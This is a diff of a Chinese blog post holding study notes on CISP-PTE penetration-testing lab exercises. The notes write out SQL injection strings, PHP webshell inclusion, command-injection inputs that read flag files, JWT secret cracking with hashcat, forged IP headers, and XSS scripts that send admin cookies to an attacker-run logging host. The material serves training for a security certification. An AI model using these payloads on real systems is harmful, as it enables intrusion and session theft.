@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="记录cisp-pte的基础题学习和刷题的笔记">
+  <meta name="description" content="第一部分参考# CISP-PTE八套真题详解（侵删）的学习笔记 第一套题目sql注入：order by没有用，直接进入union select阶段，找到有回显的字段2和3。后面就是常规的union注入 文件上传：关键词被过滤 上传preg_replace.php 不使用eval的免杀马一句话木马php函数一句话木马 文件包含：尝试data:&#x2F;&#x2F;text&#x2F;plain,">
 <meta property="og:type" content="article">
-<meta property="og:title" content="cisp-pte基础题笔记">
-<meta property="og:url" content="https://guayu-kakeru.github.io/posts/19448.html">
+<meta property="og:title" content="guayu-kakeru">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/0.html">
 <meta property="og:site_name" content="guayu-kakeru">
-<meta property="og:description" content="记录cisp-pte的基础题学习和刷题的笔记">
+<meta property="og:description" content="第一部分参考# CISP-PTE八套真题详解（侵删）的学习笔记 第一套题目sql注入：order by没有用，直接进入union select阶段，找到有回显的字段2和3。后面就是常规的union注入 文件上传：关键词被过滤 上传preg_replace.php 不使用eval的免杀马一句话木马php函数一句话木马 文件包含：尝试data:&#x2F;&#x2F;text&#x2F;plain,">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/68a82cab58cb8da5c842a678.png">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/68b1748b58cb8da5c8617f51.png">
@@ -47,15 +47,28 @@
 <meta property="og:image" content="https://pic1.imgdb.cn/item/68b5b42a58cb8da5c86cdfd8.png">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/68b6a10a58cb8da5c871f712.png">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/68b6a15e58cb8da5c871fb01.png">
-<meta property="article:published_time" content="2025-08-29T09:43:02.000Z">
-<meta property="article:modified_time" content="2025-09-02T09:51:59.801Z">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/68c2337a58cb8da5c89a202e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/68c394a558cb8da5c8a051ae.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/12/7dd661365aa0efeb.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/12/14697e122706e076.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/12/a76d8de318476e85.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/12/e56ab2161d119d34.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/12/9d67f78e59142ba7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/68c91229c5157e1a880ae5c4.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/68c91407c5157e1a880b01da.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/68c9154ac5157e1a880b0851.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/16/3b55dcc89b2e8fc8.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/16/ab6f089a98aa9501.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/16/24164a8f865134b2.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/16/9f7465a92cae2b87.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2025/09/16/12e9a1930c7ed37e.png">
+<meta property="article:published_time" content="2025-08-29T09:43:02.729Z">
+<meta property="article:modified_time" content="2025-09-16T10:04:28.050Z">
 <meta property="article:author" content="guayu-kakeru">
-<meta property="article:tag" content="cisp-pte">
-<meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://pic1.imgdb.cn/item/68a82cab58cb8da5c842a678.png">
 
-<link rel="canonical" href="https://guayu-kakeru.github.io/posts/19448.html">
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/0.html">
 
 
 <script id="page-configurations">
@@ -68,7 +81,7 @@
   };
 </script>
 
-  <title>cisp-pte基础题笔记 | guayu-kakeru</title>
+  <title> | guayu-kakeru</title>
   
 
 
@@ -216,7 +229,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/19448.html">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/0.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -229,7 +242,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          cisp-pte基础题笔记
+          
         </h1>
 
         <div class="post-meta">
@@ -246,7 +259,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-09-02 17:51:59" itemprop="dateModified" datetime="2025-09-02T17:51:59+08:00">2025-09-02</time>
+                <time title="修改时间：2025-09-16 18:04:28" itemprop="dateModified" datetime="2025-09-16T18:04:28+08:00">2025-09-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -255,10 +268,6 @@
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%AC%94%E8%AE%B0/cisp-pte/" itemprop="url" rel="index"><span itemprop="name">cisp-pte</span></a>
                 </span>
             </span>
 
@@ -274,9 +283,7 @@
       
       
       
-        <p>记录cisp-pte的基础题学习和刷题的笔记</p>
-<span id="more"></span>
-<h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45813980/article/details/134488597"># CISP-PTE八套真题详解（侵删）</a>的学习笔记</p>
+        <h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45813980/article/details/134488597"># CISP-PTE八套真题详解（侵删）</a>的学习笔记</p>
 <h2 id="第一套题目"><a href="#第一套题目" class="headerlink" title="第一套题目"></a>第一套题目</h2><p>sql注入：<br>order by没有用，直接进入union select阶段，找到有回显的字段2和3。后面就是常规的union注入</p>
 <p>文件上传：<br>关键词被过滤 上传preg_replace.php 不使用eval的免杀马<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/536097761">一句话木马</a><br><a target="_blank" rel="noopener" href="https://lbsucceed.github.io/posts/yi-ju-hua-mu-ma-jian-dan-xue-xi/#str-replace-han-shu">php函数一句话木马</a></p>
 <p>文件包含：<br>尝试data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo(); ?> 发现phpinfo还在但是data:&#x2F;&#x2F;被替换成空了，所以用双写绕过。 然后上传一句话木马用antsword连接</p>
@@ -302,7 +309,7 @@
 <p>验证码爆破：<br>直接删除cookie  然后把验证码code字段置空</p>
 <h2 id="第六套题目"><a href="#第六套题目" class="headerlink" title="第六套题目"></a>第六套题目</h2><p>sql注入：<br>考察万能密码<br>用户名处 <code>admin &#39;=&#39;</code> 密码处 <code>1&#39; Or &#39;1&#39;=&#39;1</code></p>
 <p>sql注入：<br>用–+ 注释  根据sql语句用’)闭合 用order by 尝试 发现有7个字段<br>用union联合查询的时候 发现被过滤 用双写绕过<br>最后用load_file读取key </p>
-<p>xss：<br>考察用xss获取admin的cookie然后登录admin<br>payload:<br><code>&lt;sript&gt;document.write(&#39;&lt;img src=&quot;http://192.168.xx.xx?xxxx?&#39; + document.cookie + &#39;&quot; /&gt;&#39;); &lt;/script&gt;</code><br>然后在攻击端口开http服务 就可以在url中看到cookie<br><img src="https://pic1.imgdb.cn/item/68b1748b58cb8da5c8617f51.png"><br>用cookie登录后可以看到key</p>
+<p>xss：<br>考察用xss获取admin的cookie然后登录admin<br>payload:<br><code>&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://192.168.xx.xx?xxxx?&#39; + document.cookie + &#39;&quot; /&gt;&#39;); &lt;/script&gt;</code><br>然后在攻击端口开http服务 就可以在url中看到cookie<br><img src="https://pic1.imgdb.cn/item/68b1748b58cb8da5c8617f51.png"><br>用cookie登录后可以看到key</p>
 <p>文件包含：<br>就是考察文件包含<br><code>?data://text/plain,&lt;?php @eval($_POST[&#39;x&#39;]); ?&gt;</code> 然后用蚁剑连接之后找到flag</p>
 <p>代码审计<br><img src="https://pic1.imgdb.cn/item/68b175b458cb8da5c8617ffa.png"><br>用闭合+命令的方式<br>payload: <code>?a=&quot;);system(&quot;ls</code></p>
 <h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><p>在培训提供平台上的题目练习</p>
@@ -332,6 +339,17 @@
 <p>将输出的结果用get方式用str参数传入<br>第四题：</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$v1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$v2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$a</span> = (<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;w&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>]) ? <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>) : <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (@<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>]) &#123;</span><br><span class="line">        (<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>] &gt; <span class="number">2020</span>) ? <span class="variable">$v1</span> = <span class="number">1</span> : <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(@<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>]) != <span class="number">5</span> <span class="keyword">or</span> !<span class="title function_ invoke__">is_array</span>(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;cisp-pte&quot;</span>, <span class="variable">$a</span>[<span class="string">&quot;bar3&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> === <span class="literal">false</span> ? <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>) : <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="variable">$val</span> == <span class="string">&quot;cisp-pte&quot;</span> ? <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>) : <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$v2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$v1</span> &amp;&amp; <span class="variable">$v2</span>) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;key.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>
 <p>按照题目的要求一步步分析<br>首先要传入一个参数w  w是一个json格式的参数并且w是一个数组<br>数组的bar1元素不能是数字 但是要大于2020  这里利用php的弱比较 用数字加字母 比较时候会自动转为数字<br>数组的bar2元素是一个数组，要有五个元素，并且这个bar2数组的第一个元素也是数组<br>bar3元素也是数组，数组中要有”cisp-pte”元素<br>bar2元素不能有”cisp-pte”<br><code>?w=&#123;&quot;bar1&quot;:&quot;2024a&quot;,&quot;bar2&quot;:[[&quot;a&quot;],[&quot;b&quot;],[&quot;c&quot;],[&quot;d&quot;],[&quot;e&quot;]],&quot;bar3&quot;:[&quot;test&quot;,&quot;cisp-pte&quot;,123]&#125;</code></p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>第一题 ：<br><img src="https://pic1.imgdb.cn/item/68c2337a58cb8da5c89a202e.png"><br>可以执行一个ping命令 要拿到flag  可以用 &amp; 隔断 后面加上想要执行的命令<br>127.0.0.1 &amp; tac &#x2F;var&#x2F;www&#x2F;html&#x2F;key.flag cat被过滤了 要用tac<br>第二题：<br>和第一题一样都是验证主机存活命令 用|分割 这里过滤了cat 和 tac 可以用sort命令查看<br>127.0.0.1 | sort &#x2F;flag.php<br>第三题：<br>首先尝试ls 发现被过滤 然后在直接输入&#x2F;flag.php 发现也是被过滤的，猜测有关键字或者黑名单，用通配符&#x2F;flag.*就可以<br>用nl命令就可以查看<br><img src="https://pic1.imgdb.cn/item/68c394a558cb8da5c8a051ae.png" alt="|500"><br>第四题： 启动环境，找找看，flag在flag.php中，flag格式为：flag_nisp_xxxxxx，他隐藏的不浅啊<br>还是一个ping命令  用 | 分割 ls &#x2F; 找到一个nisp92234目录 flag.php在里面<br><code>127.0.0.1 | nl /nisp92234/flag.*</code></p>
+<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>第一题：  请通过暴力破解登录成功后获取flag。<br>题目给了一个字典 ， 虽然网站这个有验证码 但是这个验证码就算不修改也能爆破<br>在burpsuite中的爆破模块爆破 加载字典<br>找到密码是abcd1234<br><img src="https://s3.bmp.ovh/imgs/2025/09/12/7dd661365aa0efeb.png"><br>第二题：  进入管理员面板，删除mary，就能获得flag值了<br>这里先提供了一个测试账号，告诉我们当前的用户是user  既然给了测试账号还有角色，应该是要越权到admin用户<br>点击admin panel 然后在bp中拦截<br><img src="https://s3.bmp.ovh/imgs/2025/09/12/14697e122706e076.png"><br>在bp中可以看到jwt的相关信息 tom这个用户的当前角色是user<br><img src="https://s3.bmp.ovh/imgs/2025/09/12/a76d8de318476e85.png"><br>现在要把现在的jwt数据拿到hashcat中爆破得到密钥<br><code>D:\tool\hashcat-7.1.2&gt;hashcat.exe -m 16500 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0b20iLCJyb2xlIjoidXNlciIsImNzcmYiOiI0NzkyNjEzNmIxNzZhNGU0IiwiZXhwIjoxNzU3NjU0Mjc0fQ.yvrDsISCNvMVd5JmHUyIbXQsd9ZtTl86zG0zifz7ehg &quot;D:\字典\xato-net-10-million-passwords-10000.txt&quot;</code><br>成功爆破出密钥secret1<br>在bp的jwt editor插件中生成一个jwt 这里k修改成密钥的base64编码格式<br><img src="https://s3.bmp.ovh/imgs/2025/09/12/e56ab2161d119d34.png"><br>回到刚才拦截的包中，把role改成admin 然后点sign 用刚刚生成的key<br><img src="https://s3.bmp.ovh/imgs/2025/09/12/9d67f78e59142ba7.png"><br>然后进入admin面板里面 在删除的时候也重复上面的步骤 删除也需要admin的权限 然后拿到flag</p>
+<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>第一题 ： 启动环境，想办法，以管理员身份打开首页，就能获得flag值了呢<br>先在ceye.io注册一个账号，然后再profile里拿到自己的一个域名<br>在留言板中写</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;http://eq76xx.ceye.io/log?&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span> + <span class="string">&#x27;&quot;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>然后在ceye中可以看到外带出来的cookie<br><img src="https://pic1.imgdb.cn/item/68c91229c5157e1a880ae5c4.png"><br>把这个cookie加入网站中就能在首页看到flag  cookie的name是session<br>第二题： 启动环境，想办法，要读取到管理员的cookie，﻿就能获得flag值了呢，<br>和上一题一样的payload  cookie就是flag</p>
+<h2 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h2><p>第一题： 请根据提示获取flag<br><img src="https://pic1.imgdb.cn/item/68c91407c5157e1a880b01da.png"><br>开始后 首页提示需要本地访问  所以在modified header里面加上X-Forwarded-For : 127.0.0.1<br>下一步是要把guest用户越权到admin<br>打开burpsuite  把isAdmin修改成true 然后Username改成admin的base64编码<br><img src="https://pic1.imgdb.cn/item/68c9154ac5157e1a880b0851.png"><br>第二题：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用户已经通过弱口令得知了用户名admin密码admin123 ，但是服务端却限制IP地址，该如何伪造地址。</span><br><span class="line">部分源码如下：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cip</span> != <span class="string">&quot;1.2.3.4&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;非法IP地址，只有1.2.3.4才能访问！&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br></pre></td></tr></table></figure></div>
+<p>根据题目意思 只要在请求头中加入Client-IP 1.2.3.4再登录就可以了<br><img src="https://s3.bmp.ovh/imgs/2025/09/16/3b55dcc89b2e8fc8.png"><br>第三题：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">访问网站 IP被限制，该如何绕过。</span><br><span class="line">部分源码如下：</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line"><span class="variable">$cip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cip</span> == <span class="string">&quot;2.2.2.1&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;success&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;登录成功！&lt;/h2&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;flag&#123;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$flag</span>) . <span class="string">&#x27;&#125;&lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;error&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;登录失败&lt;/h2&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;IP地址验证失败&lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;当前IP: &#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$cip</span>) . <span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>只要修改一个X-Forwarded-For就好了<br>第四题：<br>题目：Admin Panel 的隐秘后门<br>描述：你能发现管理员面板的隐藏访问方式吗？<br>目标：删除用户tom 获取 flag<br>进入题目后 进入admin panel<br><img src="https://s3.bmp.ovh/imgs/2025/09/16/ab6f089a98aa9501.png"><br>提示要管理员和本地访问 bp抓包之后发现修改isadmin 和 添加x-forwarded-for 不起作用<br>这题考察的是TRACE请求方式 通过这个方式发送后 会返回完整的请求包 在里面可以看到指定ip的字段 X-Custom-IP-Authorization<br>把username和isadmin像上面一样修改之后 在加上X-Custom-IP-Authorization: 127.0.0.1 就可以进入admin面板了<br>删除tom用同样的方式 请求方式改成post</p>
+<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>第一题：<br><img src="https://s3.bmp.ovh/imgs/2025/09/16/24164a8f865134b2.png"><br>用notepad打开 搜索中用正则表达式<code> ^172\.16\.12\.12.*&quot; 200 .*</code> 搜索以这个ip开头 访问状态码的所有内容<br><img src="https://s3.bmp.ovh/imgs/2025/09/16/9f7465a92cae2b87.png"><br>发现黑客多次访问adminlogin.php 猜测是密码爆破 用bp爆破admin密码 得到password123 登录后得到flag<br>第二题：<br><code>^.*&quot;[A-Z]+ /(?!/?(index|css|manage|upload|footer)).*\.(php|jsp\asp).*&quot; 200.*</code><br>用<code>[A-Z]</code>匹配请求方式 &#x2F;?是第二个可有可无的&#x2F;  排除一些常见的路径 匹配后缀 返回码要是200 的<br><img src="https://s3.bmp.ovh/imgs/2025/09/16/12e9a1930c7ed37e.png"><br>找到&#x2F;admin&#x2F;backdoor.php</p>
 
     </div>
 
@@ -347,7 +365,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://guayu-kakeru.github.io/posts/19448.html" title="cisp-pte基础题笔记">https://guayu-kakeru.github.io/posts/19448.html</a>
+    <a href="https://guayu-kakeru.github.io/posts/0.html" title="">https://guayu-kakeru.github.io/posts/0.html</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -357,10 +375,6 @@
 
 
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/cisp-pte/" rel="tag"># cisp-pte</a>
-              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
-          </div>
 
         
 
@@ -433,7 +447,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86"><span class="nav-text">第一部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第一套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第二套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第三套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第四套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第五套题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E5%A5%97%E9%A2%98%E7%9B%AE"><span class="nav-text">第六套题目</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86"><span class="nav-text">第二部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">代码审计</span></a></li></ol></li></ol></div>
